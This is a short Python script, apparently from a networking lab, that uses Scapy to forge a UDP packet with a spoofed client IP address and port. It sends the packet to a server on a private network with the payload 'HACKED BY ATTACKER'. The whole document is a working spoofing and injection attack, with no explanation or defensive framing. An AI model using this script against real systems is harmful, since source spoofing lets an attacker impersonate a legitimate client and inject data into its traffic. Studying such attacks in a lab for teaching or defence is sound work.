from scapy.all import *


server_ip = "192.168.43.8"
server_port = 9999

spoofed_client_ip = "192.168.43.95"  
spoofed_client_port = 51130            


pkt = IP(src=spoofed_client_ip, dst=server_ip) / \
      UDP(sport=spoofed_client_port, dport=server_port) / \
      Raw(load="HACKED BY ATTACKER\n")

send(pkt, verbose=1)
